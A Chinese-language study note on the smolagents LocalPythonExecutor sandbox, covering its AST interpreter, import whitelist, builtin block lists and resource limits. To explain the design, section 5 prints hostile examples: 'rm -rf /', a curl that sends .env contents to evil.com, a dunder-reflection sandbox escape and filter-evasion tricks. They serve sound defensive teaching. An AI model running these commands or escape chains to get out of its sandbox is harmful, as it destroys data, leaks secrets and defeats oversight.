---
created: 2026-05-14
status: active
tags: [smolagents, executor, sandbox, mental-model, role-overview, day6, source-reading]
---

# `LocalPythonExecutor` Role Overview：沙箱整体角色 + 3 层防御

> ⚠️ **必读前置**：
> - Day 5 [02 CodeAgent 演出版 第 4 幕](../day5-step-stream/02-codeagent-walkthrough.md) — "代码助手老沙"接口预告
> - Week 1 [codeagent-how-it-works Q3 + Q4](../../02-concepts/codeagent-how-it-works.md) — 3 Layer 限制 + prompt 教 + 沙箱拒 + 错误反馈 三层闭环
> - Day 5 [03 §11 能力边界](../day5-step-stream/03-impl-diff-deep-dive.md) — 3 Layer 概念
>
> 📋 **LEARNING_PLAN 阅读深度**：Day 6 是 **"浏览即可 / 层次 1"** —— 看懂大致流程 + 安全机制，**不需要逐行精读** 30+ 个 evaluate_xxx 函数。

---

## 1. 一句话定调

`LocalPythonExecutor` 是 CodeAgent 的 **"代码助手老沙"** —— 它把 LLM 写的 Python 代码字符串塞进**受限 AST 解释器**跑：能执行白名单内的语法 + 调用白名单内的工具 + import 白名单内的模块，但**会拒绝危险操作**（不在白名单的 import / 危险 builtins / 死循环）。

**核心思想**：**不直接 `exec()` 用户代码**（那等于交出整个 Python 解释器权限）。而是**自己写一个 AST 解释器**，每个 AST 节点都过自己的 `evaluate_xxx` 函数 —— 想阻拦什么就在对应 evaluator 里加判断。

---

## 2. 沙箱在整个系统里的位置

```
┌─ Day 4 ─────────────────────────────────────────────┐
│ MultiStepAgent.run() → _run_stream() 外循环         │
│            ↓ for each step                          │
└─────────────────────────────────────────────────────┘
            ↓
┌─ Day 5 ─────────────────────────────────────────────┐
│ CodeAgent._step_stream(action_step):                │
│   ① read messages                                    │
│   ② call LLM → 拿到代码字符串                       │
│   ③ parse_code_blobs → code_action                  │
│   ④ python_executor(code_action) ──────────────┐    │
│   ⑤ yield ActionOutput                          │    │
└─────────────────────────────────────────────────┼────┘
                                                  ↓
┌─ Day 6 ─── 本笔记焦点 ────────────────────────────┐
│ LocalPythonExecutor.__call__(code_action):       │
│   evaluate_python_code(code):                     │
│     1. ast.parse(code)         ← 语法解析         │
│     2. 初始化 state, static_tools                │
│     3. 包装 final_answer → 抛 FinalAnswerException│
│     4. ⭐ 遍历 AST 节点 evaluate_ast(node, ...)  │
│        ├── 每个节点过 evaluate_xxx               │
│        ├── 危险操作 → InterpreterError           │
│        └── 不在白名单 → InterpreterError         │
│     5. 捕获 FinalAnswerException → is_final=True │
│   → 返回 CodeOutput(output, logs, is_final)      │
└────────────────────────────────────────────────────┘
```

---

## 3. ⭐⭐ 3 层防御机制（核心）

CodeAgent 不会让 LLM 删你硬盘，靠这 **3 层**互相独立的拦截：

### 层 1：白名单 import（模块层）

| 字段 | 内容 | 行号 |
|---|---|---|
| `BASE_BUILTIN_MODULES` | 默认允许的 stdlib：`collections / datetime / itertools / math / queue / random / re / stat / statistics / time / unicodedata` | [utils.py:49](../../../../src/smolagents/utils.py#L49) |
| `additional_authorized_imports` | 用户追加（如 `["pandas", "numpy"]`）| CodeAgent `__init__` 参数 |
| `DANGEROUS_MODULES` | 显式禁止：`builtins / io / multiprocessing / os / pathlib / pty / shutil / socket / subprocess / sys` | [local_python_executor.py:130](../../../../src/smolagents/local_python_executor.py#L130) |

**执行点**：[evaluate_import](../../../../src/smolagents/local_python_executor.py#L1309) 在 AST 看到 `import X` 节点时调 `check_import_authorized(X, authorized_imports)`，不在白名单 → 抛 `InterpreterError("Forbidden access to module: X")`。

> 💡 **`*` 通配符**：用户也能传 `additional_authorized_imports=["*"]` 允许所有 import —— 这等于关闭层 1。**学习时别用，生产更别用**（除非完全可信）。

### 层 2：危险 builtins 拦截（函数层）

| 拦截目标 | 怎么拦 |
|---|---|
| `__import__` / `__class__` / `__base__` 等 dunder 反射 | [nodunder_getattr](../../../../src/smolagents/local_python_executor.py#L68)：`getattr` 被替换，dunder 名直接拒 |
| `exec / eval / compile / globals / locals / __import__` | [DANGEROUS_FUNCTIONS](../../../../src/smolagents/local_python_executor.py#L143) 黑名单 + [check_safer_result](../../../../src/smolagents/local_python_executor.py#L156) 校验返回值 |
| `os.system / os.popen / posix.system` | 同上黑名单 |
| 函数调用一般检查 | [safer_eval](../../../../src/smolagents/local_python_executor.py#L185) 装饰器包在每个 evaluator 上 |

**机制**：沙箱**不暴露**完整的 Python builtins。`BASE_PYTHON_TOOLS`（[local_python_executor.py:74](../../../../src/smolagents/local_python_executor.py#L74)）显式列出允许的内置函数（`print / range / list / dict / max / min / sum / abs / sorted / ... / math 系列`），**LLM 在沙箱里能用的内置函数 = 这个白名单 ∪ 用户 tools**。

> 💡 **沙箱内 `print` 是个假货**（`custom_print` 返回 None）—— 因为真正的 `print` 输出由 [PrintContainer](../../../../src/smolagents/local_python_executor.py#L240) 拦截，写到 `state["_print_outputs"]`，最终成为 `CodeOutput.logs`（Day 5 02 第 4 幕的 logs）。

### 层 3：资源限制（运行时层）

| 限制 | 默认值 | 防什么 |
|---|---|---|
| `MAX_EXECUTION_TIME_SECONDS` | 30 秒 | 死循环 / 太慢的代码 |
| `MAX_OPERATIONS` | 10_000_000 | 异常多的运算（虽然 30s 应该也撑不到这个）|
| `MAX_WHILE_ITERATIONS` | 1_000_000 | while 循环过多 |
| `DEFAULT_MAX_LEN_OUTPUT` | 50_000 字符 | `_print_outputs` 不让爆 |

**机制**：[timeout 装饰器](../../../../src/smolagents/local_python_executor.py#L285) 把 `_execute_code` 包一层 —— 超时抛 `ExecutionTimeoutError`。

---

## 4. 沙箱默认内置工具：`BASE_PYTHON_TOOLS`

LLM 在沙箱里能直接用的 Python 内置 / math 函数（**不算 user tools**，是"白名单的 builtins"）：

```python
# 基础类型 + 转换
print, isinstance, range, float, int, bool, str, set, list, dict, tuple, type, complex

# 迭代 / 集合
len, sum, max, min, abs, enumerate, zip, reversed, sorted, all, any, map, filter

# 数学
round, ceil, floor, log, exp, sin, cos, tan, asin, acos, atan, atan2, degrees, radians, pow, sqrt

# 杂项
ord, chr, next, iter, divmod, callable, getattr (replaced by nodunder_getattr), hasattr, setattr, issubclass
```

—— **典型场景**：算 `max(temps)` / `sqrt(x)` / `sorted(list)` 直接用，不需要 import math。

---

## 5. AST 解释器入门：为什么不直接 `exec()`

### 🆕 先扫一眼：什么是 AST？

**AST = Abstract Syntax Tree（抽象语法树）= 源代码被解析后的"树状结构表示"**。

把"字符串形式的代码"翻译成"结构化的树"，让程序能像处理数据结构那样处理代码。

**用我们的例子看具体长啥样**。代码字符串：

```python
max_temp = max(temps)
```

`ast.parse(...)` 解析后变成的 AST 树（简化）：

```
            Assign
           /      \
       targets    value
          |         |
         Name      Call
         "max_temp"  / \
                  func args
                   |    |
                 Name  Name
                 "max" "temps"
```

每个节点是一个 Python 对象（`ast.Assign` / `ast.Call` / `ast.Name` ...），有明确的**类型**和**子节点**。

**为什么需要 AST（不直接处理字符串）**：

| 形式 | 问题 |
|---|---|
| **字符串** `"max_temp = max(temps)"` | 想知道"这行调了哪个函数？参数是什么？"要写复杂 regex，括号嵌套 / 空格 / 注释全是坑 |
| **AST 树** | 直接看节点类型：`Call.func.id == "max"`，`Call.args[0].id == "temps"`，**结构化无歧义** |

**Python 的 `ast` 模块是标准库内置**，不是 smolagents 自创：

```python
import ast
tree = ast.parse("max_temp = max(temps)")  # → AST 树对象
ast.dump(tree)                              # 打印结构
# → Module(body=[Assign(targets=[Name(id='max_temp')],
#         value=Call(func=Name(id='max'), args=[Name(id='temps')], ...))], ...)
```

**一个类比帮你彻底记住**：字符串 → 树这步叫 **parse（解析）**，几乎所有"在执行前理解代码"的程序都做这一步。

| 类比对 | 字符串形式 | 树形式 |
|---|---|---|
| 中文句子 | "我吃苹果" | 主语(我) + 谓语(吃) + 宾语(苹果) |
| HTML | `<div><p>hi</p></div>` | DOM 树 |
| JSON | `'{"a": 1, "b": [2,3]}'` | `dict` 嵌套结构（`json.loads` 后）|
| Python 代码 | `"max(temps)"` | `Call(func=Name("max"), args=[Name("temps")])` |

> 💡 **AST 不是 Python 特有**：几乎所有编程语言（C / Java / JS / TS / Go / Rust ...）的编译器内部都用 AST。是个**跨语言的通用 CS 概念**。Python 把它做成了标准库 `ast` 模块直接给用户用。

> 💡 **谁用 AST**：编译器（高级语言 → 机器码）/ 代码格式化工具（black、prettier）/ 静态分析（mypy、pylint）/ IDE 跳转与重构 / **smolagents 沙箱** ← 我们这里的场景。

### ⭐ 设计权衡：4 个方案逐个对比（为什么必须 AST）

直觉问题：**"既然 Python 解释器已经能跑代码，为什么 smolagents 要写 1700 行 AST 解释器？"**

答案：因为 **Python 解释器是"全开放"的** —— 你没办法告诉它"跑这段但不许碰系统调用"。**它要么全跑要么全不跑**（exec 没有"半开"模式）。

4 个候选方案，逐个看为什么前 3 个都不行：

#### 方案 1：直接 `exec()`

```python
exec(llm_generated_code)
```

**LLM 写这种代码就完蛋**：

```python
import os
os.system("rm -rf /")  # 删你硬盘

# 或者：
__import__("subprocess").run([
    "curl", "https://evil.com/leak",
    "-d", open(".env").read()  # 把你的 token 发出去
])
```

**结论**：完全失控，直接 pass。

#### 方案 2：限制 `globals` / `builtins`

很多人第一直觉是"我把危险的全删了不就行"：

```python
safe_globals = {"__builtins__": {"print": print, "max": max}}
exec(llm_generated_code, safe_globals)  # 只暴露 print 和 max
```

看起来很安全？**但 LLM 还能这样**（Python 沙箱逃逸经典）：

```python
().__class__.__base__.__subclasses__()[-1].__init__.__globals__["sys"].modules["os"].system("rm -rf /")
```

这行代码做什么：

1. `()` 是空 tuple → `().__class__` = `tuple` 类
2. `.__base__` = `object`（所有 Python 类的根）
3. `.__subclasses__()` = **所有 Python 类的列表**（含 `subprocess.Popen` / `BuiltinImporter` 等危险类）
4. 从列表里找到 Popen → **拿到 `os` 模块** → 执行任意命令

注意 `safe_globals` 里**根本没出现 `os` / `import` 这种关键字**，但 **Python 对象模型本身就泄露了所有类的引用** —— dunder 反射全爬出来。**这是 CTF 经典题**。

**结论**：限 globals 不够，Python 对象模型本身就是反射漏洞。

#### 方案 3：字符串过滤（黑名单关键词）

```python
if "import os" in llm_code: 拒绝
if "__class__" in llm_code: 拒绝
if "subprocess" in llm_code: 拒绝
```

LLM 各种花式绕：

```python
mod_name = "o" + "s"
mod = __import__(mod_name)        # 拼接绕过黑名单
mod.system("rm -rf /")

exec("import os; os.system('rm -rf /')")  # exec 二次执行

getattr(__builtins__, "__imp" + "ort__")("os")  # dunder 拼接
```

**结论**：黑名单永远漏。攻击者能拼接 / 编码 / Base64 绕。

#### 方案 4：AST 解析 + 自定义遍历 ⭐ smolagents 选这个

```python
tree = ast.parse(llm_code)         # ← 拿到结构化树
for node in tree.body:
    evaluate_ast(node, ...)         # ← 自己控制每个节点的语义
```

#### 4 个方案对挡攻击的能力对照

| 攻击 | 字符串过滤能挡 | exec+globals 能挡 | AST 解析能挡 |
|---|---|---|---|
| `import os` | ⚠️ 黑名单匹配能挡 | ❌ 限不住 | ✅ 看到 `Import` 节点 + 模块名 `os` → 拒 |
| `__import__("os")` | ⚠️ 拼接能绕 | ❌ 限不住 | ✅ 看到 `Call(func=Name("__import__"))` → 拒 |
| `mod = "o"+"s"; __import__(mod)` | ❌ 拼接绕了 | ❌ 同上 | ✅ 看到 `__import__` 调用 → 拒（不管参数是字符串字面值还是变量）|
| `().__class__.__base__.__subclasses__()` | ❌ 没出现关键词 | ❌ 反射逃逸 | ✅ 看到 `Attribute(attr="__class__")` → `nodunder_getattr` 拒 |
| `eval("import os")` | ❌ 字符串里 | ❌ 限不住 | ✅ 看到 `Call(func=Name("eval"))` → 拒（eval 在 DANGEROUS_FUNCTIONS）|

#### AST 的核心优势

**结构化看代码的"意图"，不是看"字符表面"**。

- 不管 LLM 怎么拼接字符串 / 怎么花式包装，**`__import__("os")` 这个调用动作在 AST 里就是 `Call(func=Name("__import__"))`** —— 模式固定，挡得住
- `getattr(x, "__class__")` 在 AST 里就是 `Call(func=Name("getattr"))` —— smolagents 把 getattr 换成 `nodunder_getattr` 直接拒

#### 一个完整的类比

| 类比 | 直接 exec | AST + 自定义 evaluator |
|---|---|---|
| 🏠 物理 | 把陌生人放进你家厨房，告诉他"别动这几个柜子"（他能撬）| 让他在监控下做每个动作，每个动作你审批 |
| 🛂 海关 | 让旅客直接走过去，"有刀别带"（藏起来呢？）| X 光机扫每件行李逐个看里面是什么 |
| 💾 SQL | 把用户输入直接拼进 SQL：`"WHERE name='" + user_input + "'"`（SQL 注入）| 用参数化查询：`"WHERE name=?"` + `(user_input,)` —— 数据库引擎**只看占位符不执行用户字符串** |

**SQL 注入这个类比最贴切**：

- 直接 `exec` ≈ 字符串拼 SQL（用户输入混入语义层）
- AST 遍历 ≈ 参数化查询（语义结构化，用户数据只能填占位符不能改语义）

#### 一句话本质

> **CodeAgent 能安全跑 LLM 写的代码，靠的不是黑名单，靠的是"自己实现解释器，每个语义点都过自己的代码"**。

这就是为什么必须用 AST，不能直接交给 Python 解释器。

### LocalPythonExecutor 的方案：自己实现 AST 解释器

```
代码字符串 → ast.parse() → AST 树
                              ↓
                  evaluate_ast(node) 递归遍历
                              ↓ 按节点类型分发
            ┌───┬───────┬─────┬──────┬────────┐
            ↓   ↓       ↓     ↓      ↓        ↓
        evaluate_call  evaluate_assign  evaluate_import  evaluate_for  ...
        (~30 个 evaluator)
                              ↓
                  每个 evaluator 自己负责检查 + 执行
```

**好处**：每个 AST 节点都过我们的代码，**想拒什么就在对应 evaluator 加判断**。完全控制语义层面。

**代价**：30+ 个 evaluate_xxx 函数（涵盖 Python 主流语法），不能直接复用 Python 解释器 → 维护成本高，但**安全可控**。

> 💡 **Day 6 不要求你看懂 30+ evaluator 细节** —— 只需要知道**这套机制存在**：AST 节点 → evaluator 函数 → 危险操作被拒。具体某个 evaluator 长啥样需要时再翻源码。

---

## 6. 类结构概览

```
┌─ PythonExecutor (ABC, 1677) ─────────────────────────┐
│  抽象 3 个方法：                                       │
│  - send_tools(tools)        ← 注册可用工具            │
│  - send_variables(vars)     ← 注入初始变量            │
│  - __call__(code) -> CodeOutput   ← 执行入口          │
└──────────────────┬───────────────────────────────────┘
                   │ 继承
   ┌───────────────┴────────────────────────────────────┐
   ▼                                                    ▼
LocalPythonExecutor (1688)              远程实现（Day 6 不深入）：
- 本进程内 AST 解释器                    - E2BExecutor (e2b.dev)
- __call__ → evaluate_python_code()      - DockerExecutor
                                          - ModalExecutor
                                          - WasmExecutor
                                          - BlaxelExecutor
```

**远程 executor 的核心差异**：代码被序列化送到远程进程 / 容器 / WebAssembly 跑（更隔离，但有网络开销）。**对外接口完全一样**（都实现 `PythonExecutor` 抽象）—— 这就是 Day 2 [tool-class-role-overview](../day2-tools/tool-class-role-overview.md) 强调的"统一抽象层"价值的另一个体现。

---

## 7. 总体执行流程 5 步骨架（[evaluate_python_code](../../../../src/smolagents/local_python_executor.py#L1583) ~85 行）

```
进入 evaluate_python_code(code, static_tools, custom_tools, state, authorized_imports, ...):

  ① ast.parse(code)
       → expression (AST 树)
       → 语法错就抛 InterpreterError("Code parsing failed on line X")

  ② 初始化 state / static_tools / custom_tools
       state["_print_outputs"] = PrintContainer()
       state["_operations_count"] = {"counter": 0}

  ③ 包装 final_answer
       原 final_answer = static_tools["final_answer"]
       static_tools["final_answer"] = 新闭包：raise FinalAnswerException(原 final_answer(*args))
       ⭐ 让"调用 final_answer" 在沙箱内变成抛异常 —— 立即中断执行

  ④ ⭐ 遍历 AST 节点（核心）
       for node in expression.body:
           result = evaluate_ast(node, state, static_tools, custom_tools, authorized_imports)
           # evaluate_ast 内部按节点类型分发到 30+ evaluate_xxx
           # 每个 evaluator 都可能抛 InterpreterError

  ⑤ 收尾 / 异常捕获
       捕获 FinalAnswerException → is_final_answer=True, return value
       捕获其他 Exception → 包成 InterpreterError 抛
       否则 → is_final_answer=False, return result (最后一个节点的值)

返回 (output, is_final_answer)
```

**第 ④ 步是真正的"沙箱执行"** —— 1700 行代码里 1500+ 行都在实现这一步的 30+ 个 evaluate_xxx 函数。Day 6 浏览时**不要 dive into 这 30+ 个**，知道架构存在就行。

---

## 8. 沙箱不是 100% 安全（局限性诚实标记）

```
✅ 阻止得了：
- import os/subprocess（白名单层 1）
- 调 exec/eval/compile（黑名单层 2）
- 死循环（timeout 层 3）
- dunder 反射跑出沙箱（nodunder_getattr）
- 资源耗尽（MAX_OPERATIONS / MAX_WHILE_ITERATIONS）

⚠️ 阻止不了 / 风险点：
- 已 authorized 的库本身有漏洞（如 pandas 某版本能读文件）
- 内存爆炸（pickle 一个超大对象、列表 × 1 亿）
- 用户传 additional_authorized_imports=["*"] 时全失效
- LocalPythonExecutor 跟主进程共享内存，沙箱崩了主进程可能受影响
```

**生产严格隔离**：用 [E2BExecutor](../../../../src/smolagents/executors/e2b_executor.py) / DockerExecutor 把代码丢到**远程独立进程 / 容器** —— 哪怕沙箱被攻破，攻击者拿到的也是临时容器（30 分钟自动销毁）。这是 Day 5 03 §11 提到的"严格隔离场景"。

> 💡 **LocalPythonExecutor 适用场景**：学习 / 原型 / 信任自己的 prompt（不会写 `additional_authorized_imports=["*"]` 这种自杀代码）。**LLM 想绕过沙箱也得用过 prompt 注入 / 漏洞挖掘**，普通任务很难触发。

---

## 9. 跟 Day 1-5 + Week 1 的闭环

| 上游 | 闭环点 |
|---|---|
| **Week 1** [codeagent-how-it-works Q3](../../02-concepts/codeagent-how-it-works.md) | "LLM 能写哪些代码"3 Layer 的实现层落地 |
| **Week 1** Q4 三层闭环 | prompt 教 + 沙箱拒 + 错误反馈 —— 本笔记"沙箱拒"的具体机制 |
| **Day 2** [tool-class-role-overview](../day2-tools/tool-class-role-overview.md) | Tool 实例怎么 send 进沙箱（[send_tools](../../../../src/smolagents/local_python_executor.py#L1763) 合并到 static_tools）|
| **Day 5 02** [codeagent-walkthrough 第 4 幕](../day5-step-stream/02-codeagent-walkthrough.md) | "代码助手老沙"的内部 = 本笔记 §7 5 步骨架 |
| **Day 5 03 §11** [能力边界](../day5-step-stream/03-impl-diff-deep-dive.md) | Layer 1/2/3 的具体实现细节 |
| **Day 5 02 番外 4** [沙箱 namespace vs state](../day5-step-stream/02-codeagent-walkthrough.md) | "executor.state" 跨步骤共享变量的机制 |

---

## 10. Day 6 接下来怎么读

| 笔记 | 内容 |
|---|---|
| **00 本笔记** | mental model 骨架 + 3 层防御 |
| **01-evaluate-python-code-walkthrough.md** | `evaluate_python_code` 5 幕剧本（用 Day 5 02 同任务）|
| **self-check.md** | Day 6 自查 8-10 题 |

---

## 11. 自检（学完本笔记应能）

- [ ] 一句话说出 LocalPythonExecutor 跟 `exec()` 的本质差异
- [ ] 默写 3 层防御机制（白名单 / 危险 builtins / 资源限制）
- [ ] 说出 `BASE_BUILTIN_MODULES` 默认包含哪些模块（至少 5 个）
- [ ] 解释为什么沙箱内的 `print` 是假货
- [ ] 说出 `FinalAnswerException` 的作用（为什么用异常而不用返回值）
- [ ] 解释 LocalPythonExecutor 不是 100% 安全的 2 个具体风险点
- [ ] 解释 `PythonExecutor` 抽象类存在的意义（本地 vs 远程统一接口）
